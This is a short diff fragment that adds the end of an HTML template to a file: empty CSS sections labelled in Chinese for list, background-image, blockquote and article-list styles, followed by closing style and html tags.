+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
